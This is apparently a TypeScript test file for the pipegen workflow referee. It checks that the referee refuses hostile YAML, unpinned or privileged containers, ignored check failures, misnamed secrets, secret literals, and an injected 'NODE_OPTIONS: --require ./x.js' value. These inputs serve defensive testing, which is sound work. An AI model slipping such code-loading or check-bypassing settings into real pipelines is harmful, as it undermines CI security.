    // the forged step counts as repo code: a real checker after it is refused by the order rule too
    const r2 = await run([wf({ lint: job([...prelude(), { ...forged, id: 'checker-run-0123456789abcdef' }, ...eSteps]) })], draftOf([e]));
    expect(has(r2, 'unreviewed'), show(r2)).toBe(true);
    expect(has(r2, 'injection'), show(r2)).toBe(true);
  });
  it('no checker spans two steps; a release tool\'s install and run with repo code between them is refused', async () => {
    for (const id of ['biome', 'eslint', 'eslint-typescript', 'oxlint-typeaware']) {
      const s = renderStep(specOf(id, { needId: 'lint' }), entry(id), platform(), ctx).steps;
      expect(s.filter((x) => x.run !== undefined).map((x) => x.id?.replace(/[0-9a-f]{16}$/, '')), id).toEqual(['checker-run-']);
    }
    const g = gitleaks();
    const script = renderProjectScript({ kind: 'project-script', needId: 'unit-tests', service: 'app', script: 'test' }, platform(), ctx).steps;
    const [install, runStep] = g.steps.filter((s) => s.id?.startsWith('tool-'));
    const d = draftOf([g.spec], { needs: [needOf('secrets'), needOf('unit-tests', true, 'app')] });
    const r = await run([wf({ mixed: job([...script, install as RenderedStep, runStep as RenderedStep]) })], d);
    expect(has(r, 'injection'), show(r)).toBe(true);
  });
});

describe('referee: more of a job, judged from the parsed file', () => {
  const g = gitleaks();
  it('a merged repo npm ci (dedupeJobSteps) must carry exactly the pins of its job\'s tools', async () => {
    const v = specOf('vitest-coverage', { needId: 'coverage' });
    const script = renderProjectScript({ kind: 'project-script', needId: 'unit-tests', service: 'app', script: 'test' }, platform(), ctx).steps;
    const vSteps = renderStep(v, entry('vitest-coverage'), platform(), ctx).steps;
    const d = draftOf([v], { needs: [needOf('coverage', true, 'app'), needOf('unit-tests', true, 'app')] });
    const merged = dedupeJobSteps([...script, ...vSteps]);
    expect(show(await run([wf({ test: job(merged) })], d))).toBe('');
    // the kept npm ci without vitest's pins: its pre-check would no longer guard vitest's lockfile entries
    const dropped = merged.map((s) => (s.id?.startsWith('pipegen-npm-ci-') ? { ...s, env: { ...s.env, PIPEGEN_NPM_EXPECT: '[]' } } : s));
    expect(has(await run([wf({ test: job(dropped) })], d), 'template')).toBe(true);
  });
  it('a step of a blocking check may not be skipped on success or have its failure ignored', async () => {
    for (const over of [{ 'continue-on-error': true }, { if: 'failure()' }]) {
      const steps = g.steps.map((s) => (s.id?.startsWith('tool-run-') ? { ...s, ...over } : s));
      expect(has(await run([wf({ scan: job(steps) })], draftOf([g.spec])), 'template'), JSON.stringify(over)).toBe(true);
    }
    const always = g.steps.map((s) => (s.id?.startsWith('tool-run-') ? { ...s, if: 'always()' } : s));
    expect(show(await run([wf({ scan: job(always) })], draftOf([g.spec])))).toBe('');
    // the same on a non-blocking check is the not-proven case (Plan G): allowed
    const d = draftOf([g.spec]);
    d.needs = d.needs.map((n) => ({ ...n, blocking: false }));
    const soft = g.steps.map((s) => (s.id?.startsWith('tool-run-') ? { ...s, 'continue-on-error': true } : s));
    expect(show(await run([wf({ scan: job(soft) })], d))).toBe('');
  });
  it('a job service runs only a reviewed image at its reviewed digest, with nothing but image, ports and env', async () => {
    const reg = entry('registry');
    const image = `${reg.step.cli?.install.package as string}@${reg.candidate.pin.digest as string}`;
    expect(show(await run([wf({ scan: job(g.steps, { services: { registry: { image, ports: ['5000:5000'] } } }) })], draftOf([g.spec])))).toBe('');
    expect(has(await run([wf({ scan: job(g.steps, { services: { db: { image: 'postgres:16' } } }) })], draftOf([g.spec])), 'unpinned')).toBe(true);
    expect(has(await run([wf({ scan: job(g.steps, { services: { db: { image: `postgres@sha256:${'e'.repeat(64)}` } } }) })], draftOf([g.spec])), 'unknown-pin')).toBe(true);
    expect(has(await run([wf({ scan: job(g.steps, { services: { registry: { image, options: '--privileged' } } }) })], draftOf([g.spec])), 'template')).toBe(true);
  });
  it('a reusable-workflow caller maps each secret under its own name, and only an allowed one', async () => {
    const caller = (mapped: Record<string, string>): CreatedFile => wf({ pipegen: { name: 'pipegen', uses: `o/pipelines/.github/workflows/gate.yml@${sha('c')}`, permissions: { contents: 'read' }, [SEC_FIELD]: mapped } });
    const fp = 'PIPEGEN_FP_KEY';
    expect(show(await run([caller({ [fp]: ref(fp) })], draftOf([])))).toBe('');
    expect(has(await run([caller({ OTHER: ref(fp) })], draftOf([])), 'injection')).toBe(true);
    expect(has(await run([caller({ DATABASE_URL: ref('DATABASE_URL') })], draftOf([])), 'permissions')).toBe(true);
  });
  it('an action step\'s env may only map a secret under its own name', async () => {
    const steps = prelude().map((s, i) => (i === 0 ? { ...s, env: { NODE_OPTIONS: '--require ./x.js' } } : s));
    expect(has(await run([wf({ a: job(steps) })], draftOf([])), 'template')).toBe(true);
  });
});

// ---------- the hostile YAML (S29) ----------

describe('referee: hostile YAML is refused before anything is judged (S29)', () => {
  const g = gitleaks();
  const base = (): string => workflowText({ scan: job(g.steps) });
  const hostile = async (text: string): Promise<RefereeReport> => run([file(text)], draftOf([g.spec]));
  it('anchors and aliases', async () => {
    const text = `${base()}  copy: &j\n    runs-on: ubuntu-latest\n    permissions: {}\n    cache-mode: none\n    steps: []\n  again: *j\n`;
    expect(has(await hostile(text), 'injection')).toBe(true);
  });
  it('an anchor alone (no alias yet) is refused too', async () => {
    expect(has(await hostile(base().replace('permissions: {}', 'permissions: &p {}')), 'injection')).toBe(true);
  });
  it('a << merge key', async () => {
    expect(has(await hostile(`${base()}  merged:\n    <<: {runs-on: ubuntu-latest}\n    permissions: {}\n`), 'injection')).toBe(true);
  });
  it('duplicate keys', async () => {
    expect(has(await hostile(`${base()}  scan:\n    runs-on: ubuntu-latest\n`), 'injection')).toBe(true);
    expect(has(await hostile(base().replace('permissions: {}', 'permissions: {}\npermissions: write-all')), 'injection')).toBe(true);
  });
  it('tags and directives', async () => {
    expect(has(await hostile(base().replace('permissions: {}', 'permissions: !!map {}')), 'injection')).toBe(true);
    expect(has(await hostile(`%YAML 1.1\n---\n${base()}`), 'injection')).toBe(true);
  });
  it('more than one document', async () => {
    expect(has(await hostile(`${base()}---\nname: second\n`), 'injection')).toBe(true);
  });
  it('a file that is not YAML, or not a map, or has a non-text key', async () => {
    for (const t of ['jobs: [1, 2\n', '- a\n- b\n', `${base()}  ? [x]\n  : 1\n`]) expect(has(await hostile(t), 'injection'), t).toBe(true);
  });
  it('a key pipegen never writes, at the top, on a job or on a step', async () => {
    expect(has(await hostile(`${base()}defaults:\n  run:\n    shell: sh\n`), 'template')).toBe(true);
    expect(has(await run([wf({ scan: job(g.steps, { container: 'alpine' }) })], draftOf([g.spec])), 'template')).toBe(true);
    const odd = g.steps.map((s, i) => (i === 0 ? { ...s, 'working-directory': '/' } : s));
    expect(has(await run([wf({ scan: job(odd) })], draftOf([g.spec])), 'template')).toBe(true);
  });
});

// ---------- the gate, the blocking rule (B7) ----------

describe('referee: the gate check name', () => {
  const g = gitleaks();
  it('no job takes the gate\'s check name; the gate job is named from GATE_CHECK_NAME', async () => {
    const [caller, gateName] = GATE_CHECK_NAME.split(' / ') as [string, string];
    expect(has(await run([wf({ scan: job(g.steps, { name: GATE_CHECK_NAME }) })], draftOf([g.spec])), 'not-gate-readable')).toBe(true);
    expect(has(await run([wf({ scan: job(g.steps, { name: gateName }) })], draftOf([g.spec])), 'not-gate-readable')).toBe(true);
    const perms = { permissions: { contents: 'read', actions: 'read', 'pull-requests': 'read' } };
    expect(has(await run([wf({ gate: job(g.steps, { ...perms, name: 'the gate' }) })], draftOf([g.spec])), 'not-gate-readable')).toBe(true);
    expect(has(await run([wf({ gate: job(g.steps, { ...perms, name: gateName }) })], draftOf([g.spec])), 'not-gate-readable')).toBe(false);
    expect(caller).toBe('pipegen');
  });
});

describe('referee: blocking needs (B7)', () => {
  it('referee: blocking scanner without sarif demoted with note', async () => {
    const list = reviewedList().map((t) => (t.id === 'gitleaks' ? { ...t, step: { ...t.step, output: { ...t.step.output, format: 'junit' as const } } } : t));
    const t = list.find((x) => x.id === 'gitleaks') as ReviewedTool;
    const spec = specFor(t, { needId: 'secrets' });
    const r = await run([wf({ scan: job(prelude()) })], draftOf([spec]), { list });
    expect(r.demoted).toEqual(['secrets']);
    expect(r.notes.join(' ')).toMatch(/secrets/);
    expect(r.ok, show(r)).toBe(true);
  });
  it('referee: blocking dast with zap-json accepted; blocking hooks-ci accepted', async () => {
    const zap = specOf('zap-baseline', { needId: 'dast' });
    const hooks = specOf('lefthook', { needId: 'hooks-ci' });
    const r = await run([wf({ dast: job(toolJob(zap)), hooks: job(toolJob(hooks)) })], draftOf([zap, hooks]));
    expect(show(r)).toBe('');
    expect(r.demoted).toEqual([]);
  });
  it('referee: blocking format, type-check, coverage, workflow-lint, dependency-review kept blocking', async () => {
    const specs = [specOf('prettier', { needId: 'format' }), specOf('biome', { needId: 'format' }), specOf('vitest-coverage', { needId: 'coverage' }),
      specOf('actionlint', { needId: 'workflow-lint', service: undefined }), specOf('osv-scanner', { needId: 'dependency-review', service: undefined }),
      specOf('dependency-review-action', { needId: 'dependency-review', service: undefined })];
    const d = draftOf(specs);
    d.needs.push(needOf('type-check', true, 'app'));
    const r = await run([wf({ a: job(prelude()) })], d);
    expect(r.demoted).toEqual([]);
    expect(r.notes.filter((n) => /non-blocking|demot/i.test(n))).toEqual([]);
  });
  it('the category comes from the need id, never from the tool', async () => {
    // osv-scanner is both deps and dependency-review: as `deps` (findings) its sarif keeps it blocking; a junit copy would be demoted only there
    const list = reviewedList().map((t) => (t.id === 'osv-scanner' ? { ...t, step: { ...t.step, output: { ...t.step.output, format: 'junit' as const } } } : t));
    const t = list.find((x) => x.id === 'osv-scanner') as ReviewedTool;
    const r = await run([wf({ a: job(prelude()) })], draftOf([specFor(t, { needId: 'deps', service: 'app' }), specFor(t, { needId: 'dependency-review' })]), { list });
    expect(r.demoted).toEqual(['deps--app']);
  });
});

// ---------- secret values (S18), linters ----------

describe('referee: secret values and the linters', () => {
  const g = gitleaks();
  it('referee: aws key literal in workflow → secret-value issue', async () => {
    const text = workflowText({ scan: job(g.steps, { env: { CLOUD_ID: fake.awsKey() } }) });
    const r = await run([file(text)], draftOf([g.spec]));
    expect(has(r, 'secret-value'), show(r)).toBe(true);
    expect(JSON.stringify(r)).not.toContain(fake.awsKey());
    // any created file, not only workflows
    const r2 = await run([wf({ scan: job(g.steps) }), file(`token ${fake.awsKey()}\n`, 'docs/PIPEGEN.md', { part: 'docs' })], draftOf([g.spec]));
    expect(r2.issues.some((i) => i.check === 'secret-value' && i.file === 'docs/PIPEGEN.md'), show(r2)).toBe(true);
  });
  it('referee: actionlint failure surfaced as issue (linter stubbed)', async () => {
    const seen: string[][] = [];
    const deps: RefereeDeps = { runLinters: async (files, linters, token) => {
      seen.push(files.map((f) => f.path));
      expect(await linters.actionlint()).toBe('/stub/actionlint');
      expect(token).toBe('gh-stub');
      return [{ file: '.github/workflows/pipegen.yml', check: 'actionlint', message: 'expression syntax error', line: 3 }];
    } };
    const r = await run([wf({ scan: job(g.steps) })], draftOf([g.spec]), { deps });
    expect(seen).toEqual([['.github/workflows/pipegen.yml']]);
    expect(has(r, 'actionlint')).toBe(true);
    expect(r.ok).toBe(false);
  });
  it('no linter runner given → an issue, never a silent pass (7b wires runLinters)', async () => {
    const r = await referee([wf({ scan: job(g.steps) })], draftOf([g.spec]), platform(), reviewedList(), LINTERS, 'gh-stub');
    expect(has(r, 'actionlint'), show(r)).toBe(true);
  });
});

// ---------- edited user workflows (the marker convention for Plan G) ----------

describe('referee: an edited user workflow is judged only where pipegen inserted lines', () => {
  const original = [
    'name: deploy',
    'on:',
    '  push:',
    '    branches: [main]',
    'defaults: &d',
    '  run:',
    '    shell: bash',
    'jobs:',
    '  deploy:',
    '    runs-on: ubuntu-latest',
    '    steps:',
    '      - uses: actions/checkout@v4',
    '      - run: ./deploy.sh',
    '',
  ].join('\n');
  const verifySteps = (): RenderedStep[] => [{ name: 'verify', uses: (GATE.step.action?.uses as string), with: { mode: 'gate' } }];
  /** The user's file as insertVerify would leave it: `needs: [pipegen-verify]` on deploy, and the pipegen-verify job (steps through stepsToYaml). */
  const edited = (steps = verifySteps(), extra: (doc: Document) => void = () => {}): string => {
    const src = original.replace('  deploy:\n    runs-on: ubuntu-latest', '  deploy:\n    needs: [pipegen-verify]\n    runs-on: ubuntu-latest');
    const text = `${src}  pipegen-verify:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      actions: read\n      packages: read\n      attestations: read\n    cache-mode: none\n    steps: []\n`;
    const doc = parseDocument(text);
    doc.setIn(['jobs', 'pipegen-verify', 'steps'], stepsToYaml(steps));
    extra(doc);
    return doc.toString({ lineWidth: 0 });
  };
  const userFile = (text: string, over: Partial<NonNullable<CreatedFile['inserted']>> = {}): CreatedFile =>
    file(text, '.github/workflows/deploy.yml', { part: 'deploy-verify', inserted: { original, jobs: ['pipegen-verify'], needs: [{ job: 'deploy', added: ['pipegen-verify'] }], ...over } });
  const d = (): PipelineDraft => draftOf([], { profile: { ...prof, existingWorkflows: [{ path: '.github/workflows/deploy.yml', triggers: ['push'], deploys: true, [`${SEC_FIELD}Used`]: [], jobs: ['deploy'] } as unknown as ExistingWorkflow] } });
  it('the user\'s own jobs (a tag pin, anchors, no permissions) are not judged; pipegen\'s job is', async () => {
    const r = await run([userFile(edited())], d(), { list: [...reviewedList(), GATE] });
    expect(show(r)).toBe('');
    const bad = await run([userFile(edited([{ name: 'x', uses: 'actions/checkout@v4' }]))], d(), { list: [...reviewedList(), GATE] });
    expect(has(bad, 'unpinned'), show(bad)).toBe(true);
  });
  it('a change outside the inserted job and needs is refused', async () => {
    const text = edited().replace('./deploy.sh', './deploy.sh --skip-checks');
    expect(has(await run([userFile(text)], d(), { list: [...reviewedList(), GATE] }), 'template')).toBe(true);
    const undeclared = edited(verifySteps(), (doc) => doc.setIn(['jobs', 'extra'], doc.createNode({ 'runs-on': 'ubuntu-latest', steps: [{ run: 'echo hi' }] })));
    expect(has(await run([userFile(undeclared)], d(), { list: [...reviewedList(), GATE] }), 'template')).toBe(true);
    // the needs the edit claims to add must be there
    const missing = edited().replace(/needs: \[ ?pipegen-verify ?\]/, 'needs: []');
    expect(missing).not.toBe(edited());
    expect(has(await run([userFile(missing)], d(), { list: [...reviewedList(), GATE] }), 'template')).toBe(true);
  });
  it('the mark is only honoured on an existing workflow of the repository', async () => {
    const r = await run([userFile(edited())], draftOf([]), { list: [...reviewedList(), GATE] });
    expect(has(r, 'template'), show(r)).toBe(true);
  });
  it('pipegen\'s inserted job may hold no anchor or alias', async () => {
    const text = edited().replace('    runs-on: ubuntu-latest\n    permissions:', '    runs-on: &r ubuntu-latest\n    permissions:');
    expect(has(await run([userFile(text)], d(), { list: [...reviewedList(), GATE] }), 'injection')).toBe(true);
  });
  it('pipegenLines: the inserted job\'s lines and the needs line; a linter finding elsewhere is a note, not an issue', async () => {
    const text = edited();
    const f = userFile(text);
    const lines = pipegenLines(f);
    expect(lines).not.toBeNull();
    const all = text.split('\n');
    const verifyAt = all.findIndex((l) => l.startsWith('  pipegen-verify:')) + 1;
    const needsAt = all.findIndex((l) => /needs: \[ ?pipegen-verify ?\]/.test(l)) + 1;
    expect(needsAt).toBeGreaterThan(0);
    const deployAt = all.findIndex((l) => l.includes('./deploy.sh')) + 1;
    expect(lines?.has(verifyAt)).toBe(true);
    expect(lines?.has(needsAt)).toBe(true);
    expect(lines?.has(deployAt)).toBe(false);
    expect(pipegenLines(wf({ a: job(prelude()) }))).toBeNull();   // a file pipegen wrote whole: every line is judged
    const deps: RefereeDeps = { runLinters: async () => [
      { file: f.path, check: 'zizmor', message: 'unpinned action in the user job', line: deployAt },
      { file: f.path, check: 'actionlint', message: 'bad key in pipegen-verify', line: verifyAt },
    ] };
    const r = await run([f], d(), { list: [...reviewedList(), GATE], deps });
    expect(r.issues.map((i) => i.check)).toEqual(['actionlint']);
    expect(r.notes.join(' ')).toContain('unpinned action in the user job');
  });
});

